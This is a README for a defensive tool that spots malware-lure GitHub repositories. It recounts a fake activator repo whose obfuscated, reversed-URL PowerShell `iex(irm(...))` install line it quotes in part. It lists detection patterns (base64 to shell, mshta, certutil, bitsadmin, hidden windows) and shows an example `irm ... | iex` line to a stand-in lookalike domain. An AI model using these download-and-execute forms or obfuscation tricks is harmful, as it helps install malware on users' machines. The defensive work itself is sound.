# lure-check

**Tell a malware-lure GitHub repo from a real one before you paste its install line.**

A Telegram bot of mine sends me five trending GitHub repos every morning. On 26 September
2026 one of them was a fake Microsoft Activation Scripts repo with 1,774 stars. It had a
README and nothing else. The owner account was created 94 seconds before the repo. The
install line was `iex(irm(-join"…"[-1..-99]))`: the URL is stored in the README backwards,
PowerShell reverses it at run time, and it points to a lookalike domain. Someone skimming
the README does not see the domain, and neither does a scanner looking for URLs. The digest
gave the repo the same card and the same button as the other four.

```bash
python3 lure_check.py owner/repo
python3 lure_check.py --readme README.md
```

Python 3.9+, standard library only, one file. Set `GITHUB_TOKEN` to go past the 60
requests an hour GitHub allows without one.

## How it works

Two independent signals. Either one flags the repo.

- **An obfuscated install command in the README.** A string reversed with
  `-join"…"[-1..`; `iex(irm(…))` with a computed URL; a base64
  blob decoded and piped into a shell or `iex`; a hidden launch through `mshta`, `certutil`,
  `bitsadmin` or `-WindowStyle Hidden`. Zero-width characters and PowerShell backtick
  escapes (`` i`e`x ``) are stripped before matching.
- **A throwaway owner and no code.** The owner account was created less than 30 days before
  the repo, and the repo is under 10 KB or holds nothing but README and LICENSE files. A
  lookup that fails counts as unknown, so a network error cannot hide a real repo.

I ran both on everything the digest sent between 15 July and 8 October 2026: 321 repos, 314
of them still online. Each signal flags one repo, the fake activator, and nothing else.

Two rules that look obvious did not survive that run.

- **"Pipe to a shell from a non-GitHub host."** That is how 38 of the 314 legitimate repos
  install, codex, opencode, rustup and uv among them. A filter on it hides one trending repo
  in eight, so only the obfuscated forms count.
- **"Owner account younger than 30 days."** The lure's owner was 34 days old on the day the
  digest sent it. A throwaway shows in the gap between the account and the repo, not in the
  account's age on the day you look.

Exit codes: 1 if any repo looks like a lure, 2 if one could not be checked (deleted,
private, rate limit, network), 0 otherwise. `--json` prints one object per repo.

## What it does not catch

- **A plain install line to a lookalike domain.** `irm https://lookalike.example | iex` on a
  real-looking repo passes. Telling a lookalike from a real vendor needs a list of real
  vendors, and this tool does not keep one.
- **A README with a download link, on an old account.** Six more repos from the same digest,
  named like `Total-Commander`, `Acrobat-Pro-Software` and `Monero-Miner`, were gone from
  GitHub before I got to measure them. An archive to download, sometimes with a password, is
  probably what they were. There is no sample left to test a rule on, so there is no rule.
- **Malicious code inside a real codebase.** It reads only the README and the repo
  metadata.

## Where it came from

I wrote it for my trending-repo digest after the 26 September repo. It now runs before every
daily send, and a repo it flags is replaced by the next one in the ranking.

## License

MIT
